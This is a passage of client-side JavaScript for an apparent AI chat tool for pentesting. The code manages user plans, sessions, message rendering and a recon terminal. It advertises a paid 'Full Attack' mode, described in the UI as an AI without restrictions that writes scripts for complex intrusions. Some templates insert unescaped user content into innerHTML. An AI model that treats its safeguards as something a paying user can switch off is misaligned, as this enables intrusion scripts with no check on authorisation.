            const iconEl = document.getElementById('welcomeProfileIcon');
            const nameEl = document.getElementById('welcomeProfileName');
            const descEl = document.getElementById('welcomeProfileDesc');
            const featuresEl = document.getElementById('welcomeProfileFeatures');
            const restrictionEl = document.getElementById('welcomeProfileRestriction');
            
            if (iconEl) iconEl.className = `fas ${info.icon} ${info.iconColor} text-2xl`;
            if (nameEl) nameEl.textContent = info.name;
            if (descEl) descEl.textContent = profileDescriptions[profileKey];
            if (featuresEl) {
                featuresEl.innerHTML = info.features.map(f => `
                    <div class="flex items-center gap-1 text-[10px] text-gray-400">
                        <i class="fas fa-check text-green-500 text-[8px]"></i>
                        <span>${f}</span>
                    </div>
                `).join('');
            }
            if (restrictionEl) {
                if (profileKey === 'fullattack') {
                    restrictionEl.innerHTML = `<i class="fas fa-unlock mr-1 text-green-400"></i>Modo sem restricoes - todas as respostas tecnicas disponiveis`;
                } else {
                    restrictionEl.innerHTML = `<i class="fas fa-shield-check mr-1 text-blue-400"></i>IA com diretrizes de seguranca - respostas tecnicas para profissionais autorizados`;
                }
            }
        }
        
        function toggleProfileDropdown() {
            document.getElementById('profileDropdown').classList.toggle('open');
        }
        
        function selectProfile(element) {
            const value = element.dataset.value;
            const icon = element.dataset.icon;
            const color = element.dataset.color;
            const text = element.querySelector('span').textContent;
            
            document.getElementById('profileSelector').value = value;
            document.getElementById('selectedProfileIcon').className = `fas ${icon} ${color} profile-icon`;
            document.getElementById('selectedProfileText').textContent = text;
            
            document.querySelectorAll('.profile-option').forEach(opt => opt.classList.remove('selected'));
            element.classList.add('selected');
            
            document.getElementById('profileDescription').textContent = profileDescriptions[value];
            document.getElementById('profileDropdown').classList.remove('open');
            
            updateWelcomeProfile(value);
        }
        
        // Função para mostrar toast de plano necessário
        function showPlanToast() {
            const toast = document.getElementById('planToast');
            toast.classList.remove('hidden');
            setTimeout(() => toast.classList.add('hidden'), 2500);
        }
        
        // Verifica se usuário tem plano que permite o perfil
        function userCanAccessProfile(profile) {
            // Pentest é sempre liberado
            if (profile === 'pentest') return true;
            
            // Admin sempre tem acesso total
            if (currentUser?.role === 'admin') return true;
            
            // Verifica se usuário tem plano
            if (!currentUser?.plan) return false;
            
            // Verifica se o plano permite o perfil
            const planProfiles = currentUser.plan?.allowed_profiles || ['pentest'];
            return planProfiles.includes(profile);
        }
        
        // Nova função para o Attack Mode Selector (Premium UI)
        function selectAttackMode(element) {
            const mode = typeof element === 'string' ? element : element.dataset.value;
            const targetElement = typeof element === 'string' 
                ? document.querySelector(`.attack-mode[data-value="${mode}"]`)
                : element;
            
            // Verifica se o usuário pode acessar este perfil
            if (!userCanAccessProfile(mode)) {
                showPlanToast();
                return;
            }
            
            // Atualiza o valor do input oculto
            document.getElementById('profileSelector').value = mode;
            
            // Atualiza visual dos botões
            document.querySelectorAll('.attack-mode').forEach(btn => {
                btn.classList.remove('active');
            });
            targetElement.classList.add('active');
            
            // Atualiza descrição
            const descriptions = {
                'pentest': 'Reconhecimento, enumeração e testes de vulnerabilidade',
                'redteam': 'Exploits avançados, evasão e persistência',
                'fullattack': 'Criação script para invasão complexas sem restrição'
            };
            document.getElementById('profileDescription').textContent = descriptions[mode];
            
            // Atualiza o welcome profile também
            updateWelcomeProfile(mode);
        }
        
        document.addEventListener('click', function(e) {
            const dropdown = document.getElementById('profileDropdown');
            if (dropdown && !dropdown.contains(e.target)) dropdown.classList.remove('open');
        });
        
        async function onAuthSuccess() {
            // Atualiza classes do HTML para mostrar app e esconder login
            document.documentElement.classList.remove('no-token');
            document.documentElement.classList.add('has-token');
            
            authModal.classList.add('hidden');
            authModal.classList.remove('flex');
            document.getElementById('userName').textContent = currentUser?.name || 'Usuário';
            document.getElementById('userPlanBadge').textContent = currentUser?.plan?.name || 'FREE';
            logoutBtn.classList.remove('hidden');
            messageInput.disabled = false;
            sendBtn.disabled = false;
            
            // Exibe a tela inicial (homeWelcome) ao fazer login
            hideChat();
            
            // Carrega estatísticas do dashboard
            loadDashboardStats();
            
            updateUserAvatar();
            
            // Atualiza os Attack Mode buttons baseado no plano do usuário
            updateAttackModeAccess();
            
            // Atualiza acesso às Tools baseado no plano
            updateToolsAccess();
            
            // Mostra/esconde dica do terminal baseado no plano
            const terminalTipCard = document.getElementById('terminalTipCard');
            const terminalExampleBtn = document.getElementById('terminalExampleBtn');
            if (userHasTerminalAccess()) {
                if (terminalTipCard) terminalTipCard.classList.remove('hidden');
                if (terminalExampleBtn) terminalExampleBtn.classList.remove('hidden');
            } else {
                if (terminalTipCard) terminalTipCard.classList.add('hidden');
                if (terminalExampleBtn) terminalExampleBtn.classList.add('hidden');
            }
            
            // Legacy profile options (mantém compatibilidade)
            const allowedProfiles = {
                'user': ['pentest'],
                'analyst': ['pentest', 'redteam'],
                'redteam': ['pentest', 'redteam', 'fullattack'],
                'admin': ['pentest', 'redteam', 'fullattack']
            };
            
            const userAllowed = allowedProfiles[currentUser.role] || ['pentest'];
            
            document.querySelectorAll('.profile-option').forEach(option => {
                if (!userAllowed.includes(option.dataset.value)) {
                    option.style.opacity = '0.5';
                    option.style.pointerEvents = 'none';
                    option.innerHTML += ' <i class="fas fa-lock text-gray-500 ml-auto"></i>';
                }
            });
            
            await loadSessions();
            
            // Verifica se veio do terminal para análise
            checkTerminalAnalysis();
        }
        
        // Verifica se há análise do terminal pendente
        async function checkTerminalAnalysis() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('analyze') === 'terminal') {
                const analysisData = localStorage.getItem('terminalAnalysis');
                if (analysisData) {
                    try {
                        const { prompt } = JSON.parse(analysisData);
                        localStorage.removeItem('terminalAnalysis');
                        
                        // Limpa a URL
                        window.history.replaceState({}, document.title, '/chat');
                        
                        // Cria nova sessão e envia a análise
                        await createNewSession();
                        
                        // Aguarda a sessão ser criada
                        setTimeout(() => {
                            if (currentSession) {
                                messageInput.value = prompt;
                                messageForm.dispatchEvent(new Event('submit'));
                            }
                        }, 500);
                    } catch (e) {
                        console.error('Erro ao processar análise do terminal:', e);
                    }
                }
            }
        }
        
        // Verifica se usuário tem acesso às Tools (plano não-free)
        function userHasToolsAccess() {
            // Admin sempre tem acesso
            if (currentUser?.role === 'admin') return true;
            
            // Verifica se tem plano e se não é o plano free
            const planSlug = currentUser?.plan?.slug;
            return planSlug && planSlug !== 'free';
        }
        
        // Verifica se usuário tem acesso ao Terminal (apenas Full Attack ou admin)
        function userHasTerminalAccess() {
            // Admin sempre tem acesso
            if (currentUser?.role === 'admin') return true;
            
            // Apenas plano fullattack tem acesso ao terminal
            const planSlug = currentUser?.plan?.slug;
            return planSlug === 'fullattack';
        }
        
        // Atualiza acesso às Tools baseado no plano
        function updateToolsAccess() {
            const hasAccess = userHasToolsAccess();
            const hasTerminalAccess = userHasTerminalAccess();
            const toolBtns = document.querySelectorAll('.tool-btn[data-tool="true"]');
            
            toolBtns.forEach(btn => {
                const isTerminal = btn.id === 'tool-terminal';
                
                // Terminal tem regra especial - apenas Full Attack
                if (isTerminal) {
                    if (hasTerminalAccess) {
                        btn.classList.remove('disabled');
                        btn.removeAttribute('title');
                        btn.setAttribute('href', '/terminal');
                        btn.style.cursor = 'pointer';
                    } else {
                        btn.classList.add('disabled');
                        btn.setAttribute('title', '🔒 Terminal disponível apenas no plano Full Attack');
                        btn.removeAttribute('href');
                        btn.style.cursor = 'not-allowed';
                        btn.onclick = (e) => {
                            e.preventDefault();
                            showNotification('Terminal disponível apenas no plano Full Attack', 'warning');
                        };
                    }
                } else if (hasAccess) {
                    btn.classList.remove('disabled');
                    btn.removeAttribute('title');
                } else {
                    btn.classList.add('disabled');
                    btn.setAttribute('title', '🔒 Disponível nos planos Red Team e Full Attack');
                    btn.setAttribute('title', '🔒 Disponível nos planos Red Team e Full Attack');
                    // Remove href para não navegar
                    btn.removeAttribute('href');
                    btn.style.cursor = 'not-allowed';
                }
            });
        }
        
        // Carrega estatísticas do dashboard na tela inicial
        async function loadDashboardStats() {
            try {
                const res = await api('/dashboard/stats');
                if (res) {
                    // Stats
                    const sessionsEl = document.getElementById('dashStatSessions');
                    const messagesEl = document.getElementById('dashStatMessages');
                    const checklistsEl = document.getElementById('dashStatChecklists');
                    const usedEl = document.getElementById('dashStatUsed');
                    const limitEl = document.getElementById('dashStatLimit');
                    const usageBarEl = document.getElementById('dashUsageBar');
                    const userNameEl = document.getElementById('dashUserName');
                    
                    if (sessionsEl) sessionsEl.textContent = res.stats?.total_sessions || 0;
                    if (messagesEl) messagesEl.textContent = res.stats?.total_messages || 0;
                    if (checklistsEl) checklistsEl.textContent = res.stats?.total_checklists || 0;
                    if (usedEl) usedEl.textContent = res.daily_usage?.used || 0;
                    if (limitEl) limitEl.textContent = res.daily_usage?.limit || 0;
                    if (usageBarEl) usageBarEl.style.width = `${res.daily_usage?.percentage || 0}%`;
                    if (userNameEl && currentUser?.name) userNameEl.textContent = currentUser.name;
                }
            } catch (error) {
                console.error('Error loading dashboard stats:', error);
            }
        }
        
        // Atualiza os botões de Attack Mode baseado no plano do usuário
        function updateAttackModeAccess() {
            const profiles = ['pentest', 'redteam', 'fullattack'];
            
            profiles.forEach(profile => {
                const btn = document.querySelector(`.attack-mode[data-value="${profile}"]`);
                if (!btn) return;
                
                // Remove estado anterior
                btn.classList.remove('locked');
                
                // Verifica se tem acesso
                if (!userCanAccessProfile(profile)) {
                    btn.classList.add('locked');
                }
            });
            
            // Atualiza descrição para mostrar que precisa de plano
            if (!userCanAccessProfile('redteam') || !userCanAccessProfile('fullattack')) {
                const desc = document.getElementById('profileDescription');
                if (desc) {
                    desc.innerHTML = '🔒 <span class="text-yellow-500">Red Team</span> e <span class="text-red-400">Full Attack</span> requerem plano ativo';
                }
            }
        }
        
        logoutBtn.addEventListener('click', () => {
            localStorage.removeItem('token');
            token = null;
            currentUser = null;
            currentSession = null;
            location.reload();
        });
        
        async function loadSessions() {
            try {
                const data = await api('/chat/sessions');
                sessions = data.data;
                renderSessions();
            } catch (error) {
                console.error('Failed to load sessions:', error);
            }
        }
        
        const profileIcons = {
            'pentest': { icon: 'fa-crosshairs', color: 'text-[#00FF88]', bg: 'from-[rgba(0,255,136,0.2)] to-[rgba(0,212,255,0.1)]' },
            'redteam': { icon: 'fa-skull-crossbones', color: 'text-[#F97316]', bg: 'from-[rgba(249,115,22,0.2)] to-[rgba(239,68,68,0.1)]' },
            'fullattack': { icon: 'fa-biohazard', color: 'text-[#EF4444]', bg: 'from-[rgba(239,68,68,0.2)] to-[rgba(239,68,68,0.1)]' }
        };
        
        function renderSessions() {
            sessionsList.innerHTML = sessions.map(session => {
                let domainDisplay = session.target_domain;
                if (!domainDisplay && session.title) {
                    const match = session.title.match(/^([^\s-]+)/);
                    domainDisplay = match ? match[1] : session.title;
                }
                domainDisplay = domainDisplay || 'Sem dominio';
                
                const profile = profileIcons[session.profile] || profileIcons['pentest'];
                
                return `
                <div class="sidebar-item rounded-lg px-3 py-2 cursor-pointer transition-all ${currentSession?.id === session.id ? 'active' : ''}" data-id="${session.id}">
                    <div class="flex items-center gap-2">
                        <div class="w-8 h-8 rounded-lg bg-gradient-to-br ${profile.bg} flex items-center justify-center flex-shrink-0">
                            <i class="fas ${profile.icon} ${profile.color} text-sm"></i>
                        </div>
                        <div class="flex-1 min-w-0">
                            <span class="text-sm truncate block font-medium text-gray-200">${domainDisplay}</span>
                            <div class="flex items-center gap-2 text-xs text-gray-500">
                                <i class="fas fa-comment-dots"></i>
                                <span>${session.message_count} mensagens</span>
                            </div>
                        </div>
                        <button class="delete-session-btn opacity-0 p-1.5 rounded-lg hover:bg-red-500/20 text-gray-500 hover:text-red-400 transition-all" data-session-id="${session.id}" title="Excluir sessao" onclick="event.stopPropagation(); deleteSession('${session.id}')">
                            <i class="fas fa-trash-alt text-xs"></i>
                        </button>
                    </div>
                </div>
            `;
            }).join('');
            
            sessionsList.querySelectorAll('.sidebar-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    if (e.target.closest('.delete-session-btn')) return;
                    loadSession(item.dataset.id);
                });
            });
        }
        
        let sessionToDelete = null;
        
        function deleteSession(sessionId) {
            sessionToDelete = sessionId;
            const modal = document.getElementById('deleteModal');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
        }
        
        function closeDeleteModal() {
            const modal = document.getElementById('deleteModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
            sessionToDelete = null;
        }
        
        async function confirmDeleteSession() {
            if (!sessionToDelete) return;
            
            try {
                const headers = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
                if (token) headers['Authorization'] = `Bearer ${token}`;
                
                const response = await fetch(`/api/chat/sessions/${sessionToDelete}`, { method: 'DELETE', headers });
                
                if (!response.ok) {
                    const data = await response.json();
                    throw new Error(data.message || 'Erro ao excluir');
                }
                
                const deletedId = sessionToDelete;
                sessions = sessions.filter(s => s.id !== deletedId);
                renderSessions();
                
                if (currentSession?.id === deletedId) {
                    currentSession = null;
                    messagesContainer.innerHTML = '';
                    hideChat();
                }
                
                closeDeleteModal();
                showNotification('Sessao excluida com sucesso!', 'success');
            } catch (error) {
                console.error('Erro ao excluir sessao:', error);
                closeDeleteModal();
                showNotification('Erro ao excluir sessao. Tente novamente.', 'error');
            }
        }
        
        function openDomainModal() {
            const modal = document.getElementById('domainModal');
            const input = document.getElementById('domainInput');
            modal.classList.remove('hidden');
            modal.classList.add('flex');
            input.value = '';
            setTimeout(() => input.focus(), 100);
        }
        
        function closeDomainModal() {
            const modal = document.getElementById('domainModal');
            modal.classList.add('hidden');
            modal.classList.remove('flex');
        }
        
        async function confirmDomainModal() {
            const input = document.getElementById('domainInput');
            const targetDomain = input.value.trim();
            
            if (!targetDomain) {
                input.classList.add('border-red-500');
                input.focus();
                return;
            }
            
            closeDomainModal();
            
            const title = `${targetDomain} - ${new Date().toLocaleDateString('pt-BR')}`;
            
            try {
                const data = await api('/chat/sessions', {
                    method: 'POST',
                    body: JSON.stringify({ title, target_domain: targetDomain, profile: profileSelector.value })
                });
                
                currentSession = data.data;
                sessions.unshift(data.data);
                renderSessions();
                showChat();
            } catch (error) {
                console.error('Failed to create session:', error);
            }
        }
        
        // Cria nova sessão diretamente sem pedir domínio
        async function createNewSession() {
            const title = `Nova Sessão - ${new Date().toLocaleDateString('pt-BR')} ${new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'})}`;
            
            try {
                const data = await api('/chat/sessions', {
                    method: 'POST',
                    body: JSON.stringify({ title, target_domain: '', profile: profileSelector.value })
                });
                
                currentSession = data.data;
                currentSession.isNew = true; // Flag para atualizar título na primeira mensagem
                sessions.unshift(data.data);
                renderSessions();
                showChat();
            } catch (error) {
                console.error('Failed to create session:', error);
            }
        }
        
        // Atualiza o título da sessão baseado na primeira mensagem
        async function updateSessionTitle(firstMessage) {
            if (!currentSession || !currentSession.isNew) return;
            
            // Pega os primeiros 50 caracteres da mensagem como título
            let newTitle = firstMessage.substring(0, 50);
            if (firstMessage.length > 50) newTitle += '...';
            
            // Adiciona data/hora
            newTitle += ` - ${new Date().toLocaleDateString('pt-BR')} ${new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'})}`;
            
            try {
                await api(`/chat/sessions/${currentSession.id}`, {
                    method: 'PUT',
                    body: JSON.stringify({ title: newTitle })
                });
                
                currentSession.title = newTitle;
                currentSession.isNew = false;
                
                // Atualiza na lista de sessões
                const sessionIndex = sessions.findIndex(s => s.id === currentSession.id);
                if (sessionIndex !== -1) {
                    sessions[sessionIndex].title = newTitle;
                }
                
                renderSessions();
                updateSessionHeader();
            } catch (error) {
                console.error('Failed to update session title:', error);
            }
        }
        
        newChatBtn.addEventListener('click', () => createNewSession());
        
        async function loadSession(sessionId) {
            try {
                // Close mobile sidebar when loading a session
                if (window.innerWidth < 1024) {
                    closeMobileSidebar();
                }
                
                // Limpa completamente mensagens anteriores
                messagesContainer.innerHTML = '';
                
                // Remove qualquer div de streaming residual
                const streamingDiv = document.getElementById('streamingResponse');
                if (streamingDiv) streamingDiv.remove();
                
                const data = await api(`/chat/sessions/${sessionId}`);
                currentSession = data.data.session;
                renderSessions();
                updateSessionHeader();
                
                if (data.data.messages && data.data.messages.length > 0) {
                    showChat();
                    renderMessages(data.data.messages);
                } else {
                    showSessionWelcome();
                }
            } catch (error) {
                console.error('Failed to load session:', error);
            }
        }
        
        function updateSessionHeader() {
            const sessionHeader = document.getElementById('sessionHeader');
            const sessionTargetDomain = document.getElementById('sessionTargetDomain');
            const currentProfileText = document.getElementById('currentProfileText');
            const currentProfileBadge = document.getElementById('currentProfileBadge');
            
            if (currentSession && currentSession.target_domain && sessionTargetDomain && sessionHeader) {
                sessionTargetDomain.textContent = currentSession.target_domain;
                sessionHeader.classList.remove('hidden');
                sessionHeader.classList.add('flex');
            } else if (sessionHeader) {
                sessionHeader.classList.add('hidden');
                sessionHeader.classList.remove('flex');
            }
            
            // Atualiza o perfil na barra inferior
            if (currentSession && currentSession.profile && currentProfileText) {
                const pInfo = getProfileInfo(currentSession.profile);
                currentProfileText.textContent = pInfo.name;
                if (currentProfileBadge) {
                    const icon = currentProfileBadge.querySelector('i');
                    if (icon) icon.className = `fas ${pInfo.icon} ${pInfo.color}`;
                }
            }
        }
        
        function getProfileInfo(profile) {
            const profiles = {
                'pentest': { name: 'Pentest', icon: 'fa-skull-crossbones', color: 'text-red-500/70' },
                'redteam': { name: 'Red Team', icon: 'fa-crosshairs', color: 'text-orange-500/70' },
                'fullattack': { name: 'Full Attack', icon: 'fa-biohazard', color: 'text-purple-500/70' }
            };
            return profiles[profile] || { name: profile, icon: 'fa-terminal', color: 'text-gray-500/70' };
        }
        
        function showChat() {
            homeWelcome.classList.add('hidden');
            sessionWelcome.classList.add('hidden');
            messagesContainer.classList.remove('hidden');
            document.getElementById('chatInputArea').classList.remove('hidden');
            updateSessionHeader();
            
            // Mostra banner premium se usuário não tem acesso ao Full Attack
            updatePremiumBanner();
        }
        
        function updatePremiumBanner() {
            const banner = document.getElementById('premiumBanner');
            if (banner && !userCanAccessProfile('fullattack')) {
                banner.classList.remove('hidden');
            } else if (banner) {
                banner.classList.add('hidden');
            }
        }
        
        function showSessionWelcome() {
            homeWelcome.classList.add('hidden');
            sessionWelcome.classList.remove('hidden');
            messagesContainer.classList.add('hidden');
            document.getElementById('chatInputArea').classList.remove('hidden');
            updateWelcomeProfile(profileSelector.value);
            updateSessionHeader();
            updatePremiumBanner();
        }
        
        function hideChat() {
            homeWelcome.classList.remove('hidden');
            sessionWelcome.classList.add('hidden');
            messagesContainer.classList.add('hidden');
            document.getElementById('chatInputArea').classList.add('hidden');
            document.getElementById('sessionHeader').classList.add('hidden');
            document.getElementById('sessionHeader').classList.remove('flex');
            
            // Esconde o banner na home
            const banner = document.getElementById('premiumBanner');
            if (banner) banner.classList.add('hidden');
        }
        
        function renderMessages(messages) {
            // Limpa completamente o container
            messagesContainer.innerHTML = '';
            
            // Remove duplicatas baseado no conteúdo (mantém última ocorrência)
            const uniqueMessages = [];
            const seen = new Set();
            
            for (let i = messages.length - 1; i >= 0; i--) {
                const msg = messages[i];
                const key = `${msg.role}-${(msg.content || '').substring(0, 100)}`;
                if (!seen.has(key)) {
                    seen.add(key);
                    uniqueMessages.unshift(msg);
                }
            }
            
            messagesContainer.innerHTML = uniqueMessages.map(msg => createMessageHTML(msg)).join('');
            processCodeBlocks();
            scrollToBottom();
        }
        
        // Função fallback para copiar texto em navegadores antigos ou HTTP
        function fallbackCopy(text, onSuccess) {
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.cssText = 'position:fixed;left:-9999px;top:-9999px;opacity:0';
            document.body.appendChild(textarea);
            textarea.focus();
            textarea.select();
            
            try {
                const success = document.execCommand('copy');
                if (success && onSuccess) onSuccess();
            } catch (e) {
                console.error('Fallback copy failed:', e);
                alert('Não foi possível copiar. Selecione o código manualmente.');
            }
            
            document.body.removeChild(textarea);
        }
        
        // Processa blocos de código e adiciona botão de copiar
        function processCodeBlocks() {
            document.querySelectorAll('.message-content pre').forEach(pre => {
                // Evita processar duas vezes
                if (pre.parentElement.classList.contains('code-block-wrapper')) return;
                
                const code = pre.querySelector('code');
                
                // Pega o texto puro do código (textContent já decodifica entidades HTML)
                const codeText = code ? code.textContent : pre.textContent;
                
                // Detecta a linguagem da classe (ex: language-python, language-javascript)
                let lang = 'código';
                if (code && code.className) {
                    const match = code.className.match(/language-(\w+)/);
                    if (match) {
                        // Mapeia linguagens comuns para nomes mais legíveis
                        const langMap = {
                            'js': 'JavaScript',
                            'javascript': 'JavaScript',
                            'ts': 'TypeScript',
                            'typescript': 'TypeScript',
                            'py': 'Python',
                            'python': 'Python',
                            'php': 'PHP',
                            'html': 'HTML',
                            'css': 'CSS',
                            'bash': 'Bash',
                            'sh': 'Shell',
                            'shell': 'Shell',
                            'sql': 'SQL',
                            'json': 'JSON',
                            'xml': 'XML',
                            'yaml': 'YAML',
                            'yml': 'YAML',
                            'java': 'Java',
                            'c': 'C',
                            'cpp': 'C++',
                            'csharp': 'C#',
                            'cs': 'C#',
                            'go': 'Go',
                            'rust': 'Rust',
                            'ruby': 'Ruby',
                            'rb': 'Ruby',
                            'swift': 'Swift',
                            'kotlin': 'Kotlin',
                            'powershell': 'PowerShell',
                            'ps1': 'PowerShell',
                            'dockerfile': 'Dockerfile',
                            'markdown': 'Markdown',
                            'md': 'Markdown'
                        };
                        const detected = match[1].toLowerCase();
                        lang = langMap[detected] || match[1].toUpperCase();
                    }
                }
                
                // Cria wrapper
                const wrapper = document.createElement('div');
                wrapper.className = 'code-block-wrapper';
                
                // Header com linguagem e botão copiar
                const header = document.createElement('div');
                header.className = 'code-block-header';
                header.innerHTML = `
                    <span class="code-block-lang">${lang}</span>
                    <button class="code-copy-btn" type="button">
                        <i class="fas fa-copy"></i>
                        <span>Copiar</span>
                    </button>
                `;
                
                // Armazena o código no botão para copiar
                const copyBtn = header.querySelector('.code-copy-btn');
                
                // Salva o texto diretamente no dataset (puro, sem HTML entities)
                copyBtn.setAttribute('data-code', codeText);
                
                // Adiciona evento de clique
                copyBtn.onclick = function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    const textToCopy = this.getAttribute('data-code');
                    const btn = this;
                    
                    // Função para mostrar sucesso
                    const showSuccess = () => {
                        btn.classList.add('copied');
                        btn.innerHTML = '<i class="fas fa-check"></i><span>Copiado!</span>';
                        setTimeout(() => {
                            btn.classList.remove('copied');
                            btn.innerHTML = '<i class="fas fa-copy"></i><span>Copiar</span>';
                        }, 2000);
                    };
                    
                    // Método 1: Clipboard API (moderno)
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        navigator.clipboard.writeText(textToCopy)
                            .then(showSuccess)
                            .catch(() => {
                                // Fallback se clipboard falhar
                                fallbackCopy(textToCopy, showSuccess);
                            });
                    } else {
                        // Fallback para navegadores antigos
                        fallbackCopy(textToCopy, showSuccess);
                    }
                };
                
                // Insere wrapper antes do pre
                pre.parentNode.insertBefore(wrapper, pre);
                wrapper.appendChild(header);
                wrapper.appendChild(pre);
            });
        }
        
        function createMessageHTML(message) {
            const isUser = message.role === 'user';
            let displayText = message.content || '';
            let attachmentData = message.attachment || null;
            
            // Para mensagens do usuário, detecta se há arquivo anexado no conteúdo
            if (isUser && !attachmentData && message.content) {
                // Padrão: **Arquivo: nome.ext** (X linhas) seguido de bloco de código
                const filePattern = /\*\*Arquivo:\s*([^\*]+)\*\*\s*\((\d+)\s*linhas\)\s*\n\n```(\w*)\n[\s\S]*```$/;
                const match = message.content.match(filePattern);
                
                if (match) {
                    const fileName = match[1].trim();
                    const lines = match[2];
                    const ext = match[3] || fileName.split('.').pop() || 'txt';
                    
                    // Remove o bloco de arquivo/código do texto exibido
                    displayText = message.content.replace(filePattern, '').trim();
                    
                    // Cria attachment data dinamicamente
                    attachmentData = {
                        type: 'code',
                        name: fileName,
                        extension: ext,
                        lines: lines,
                        size: 'arquivo'
                    };
                }
            }
            
            const content = displayText ? marked.parse(displayText) : '';
            
            if (isUser) {
                const avatarHtml = `<img src="${userAvatarUrl || DEFAULT_AVATAR}" alt="User" class="w-full h-full object-cover rounded-lg">`;
                
                // Renderiza card de anexo se houver
                let attachmentHtml = '';
                if (attachmentData) {
                    if (attachmentData.type === 'code') {
                        const iconMap = {
                            'py': { icon: 'fab fa-python', color: 'text-yellow-400' },
                            'js': { icon: 'fab fa-js', color: 'text-yellow-300' },
                            'ts': { icon: 'fab fa-js', color: 'text-blue-400' },
                            'jsx': { icon: 'fab fa-react', color: 'text-cyan-400' },
                            'tsx': { icon: 'fab fa-react', color: 'text-cyan-400' },
                            'vue': { icon: 'fab fa-vuejs', color: 'text-green-400' },
                            'php': { icon: 'fab fa-php', color: 'text-purple-400' },
                            'html': { icon: 'fab fa-html5', color: 'text-orange-400' },
                            'css': { icon: 'fab fa-css3', color: 'text-blue-400' },
                            'scss': { icon: 'fab fa-sass', color: 'text-pink-400' },
                            'json': { icon: 'fas fa-brackets-curly', color: 'text-yellow-300' },
                            'xml': { icon: 'fas fa-code', color: 'text-orange-300' },
                            'yaml': { icon: 'fas fa-file-code', color: 'text-red-300' },
                            'yml': { icon: 'fas fa-file-code', color: 'text-red-300' },
                            'env': { icon: 'fas fa-key', color: 'text-yellow-500' },
                            'sql': { icon: 'fas fa-database', color: 'text-blue-300' },
                            'sh': { icon: 'fas fa-terminal', color: 'text-green-300' },
                            'bash': { icon: 'fas fa-terminal', color: 'text-green-300' },
                            'bat': { icon: 'fas fa-terminal', color: 'text-gray-400' },
                            'ps1': { icon: 'fas fa-terminal', color: 'text-blue-400' },
                            'cmd': { icon: 'fas fa-terminal', color: 'text-gray-400' },
                            'md': { icon: 'fab fa-markdown', color: 'text-white' },
                            'txt': { icon: 'fas fa-file-alt', color: 'text-gray-300' },
                            'log': { icon: 'fas fa-file-alt', color: 'text-gray-400' },
                            'csv': { icon: 'fas fa-file-csv', color: 'text-green-300' },
                            'c': { icon: 'fas fa-code', color: 'text-blue-400' },
                            'cpp': { icon: 'fas fa-code', color: 'text-blue-500' },
                            'java': { icon: 'fab fa-java', color: 'text-red-400' },
                            'go': { icon: 'fab fa-golang', color: 'text-cyan-400' },
                            'rs': { icon: 'fas fa-code', color: 'text-orange-500' },
                            'rb': { icon: 'fas fa-gem', color: 'text-red-400' },
                            'dockerfile': { icon: 'fab fa-docker', color: 'text-blue-400' },
                            'graphql': { icon: 'fas fa-project-diagram', color: 'text-pink-400' }
                        };
                        const ext = attachmentData.extension;
                        const iconInfo = iconMap[ext] || { icon: 'fas fa-file-code', color: 'text-[#00FF88]' };
                        
                        attachmentHtml = `
                            <div class="mt-2 bg-[rgba(0,0,0,0.3)] rounded-xl p-3 border border-[rgba(255,255,255,0.05)]">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 rounded-lg bg-[rgba(0,255,136,0.1)] flex items-center justify-center border border-[rgba(0,255,136,0.2)]">
                                        <i class="${iconInfo.icon} ${iconInfo.color} text-lg"></i>
                                    </div>
                                    <div class="flex-1 min-w-0">
                                        <p class="text-white font-medium text-sm truncate">${attachmentData.name}</p>
                                        <p class="text-gray-500 text-xs font-mono">${attachmentData.lines} linhas • ${attachmentData.size}</p>
                                    </div>
                                    <i class="fas fa-file-code text-[#00FF88]/50"></i>
                                </div>
                            </div>
                        `;
                    } else if (attachmentData.type === 'image') {
                        attachmentHtml = `
                            <div class="mt-2 bg-[rgba(0,0,0,0.3)] rounded-xl p-2 border border-[rgba(255,255,255,0.05)]">
                                <img src="${attachmentData.preview}" alt="${attachmentData.name}" class="max-h-48 rounded-lg object-contain mx-auto">
                                <p class="text-gray-500 text-xs text-center mt-1 font-mono">${attachmentData.name} • ${attachmentData.size}</p>
                            </div>
                        `;
                    }
                }
                
                return `
                    <div class="flex items-start gap-4 justify-end">
                        <div class="bg-gradient-to-br from-[rgba(0,255,136,0.15)] to-[rgba(0,212,255,0.08)] rounded-2xl rounded-tr-none px-6 py-4 max-w-3xl border border-[rgba(0,255,136,0.2)] backdrop-blur-sm">
                            ${content ? `<div class="message-content text-gray-100">${content}</div>` : ''}
                            ${attachmentHtml}
                        </div>
                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,255,136,0.1)] flex items-center justify-center flex-shrink-0 overflow-hidden border border-[rgba(0,255,136,0.2)]">
                            ${avatarHtml}
                        </div>
                    </div>
                `;
            } else {
                return `
                    <div class="flex items-start gap-4">
                        <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-[rgba(0,255,136,0.2)] to-[rgba(0,212,255,0.1)] flex items-center justify-center flex-shrink-0 p-1 border border-[rgba(0,255,136,0.3)]">
                            <img src="/logo.png" alt="DeepEyes" class="w-8 h-8 object-contain">
                        </div>
                        <div class="de-card rounded-2xl rounded-tl-none px-6 py-4 max-w-3xl">
                            <div class="message-content prose prose-invert max-w-none">${content}</div>
                        </div>
                    </div>
                `;
            }
        }
        
        function addMessage(message) {
            messagesContainer.insertAdjacentHTML('beforeend', createMessageHTML(message));
            scrollToBottom();
        }
        
        // ========================================
        // TERMINAL INTEGRADO NO CHAT
        // ========================================
        
        // Lista de comandos disponíveis para o help
        const terminalCommands = {
            'whois': { desc: 'Consulta informações WHOIS de domínios', example: 'whois example.com' },
            'dig': { desc: 'Consulta DNS detalhada', example: 'dig example.com' },
            'nslookup': { desc: 'Consulta DNS simples', example: 'nslookup example.com' },
            'host': { desc: 'Resolução de DNS', example: 'host example.com' },
            'ping': { desc: 'Teste de conectividade (4 pacotes)', example: 'ping example.com' },
            'traceroute': { desc: 'Rastreamento de rota', example: 'traceroute example.com' },
            'curl': { desc: 'Requisições HTTP (GET apenas)', example: 'curl -I example.com' },
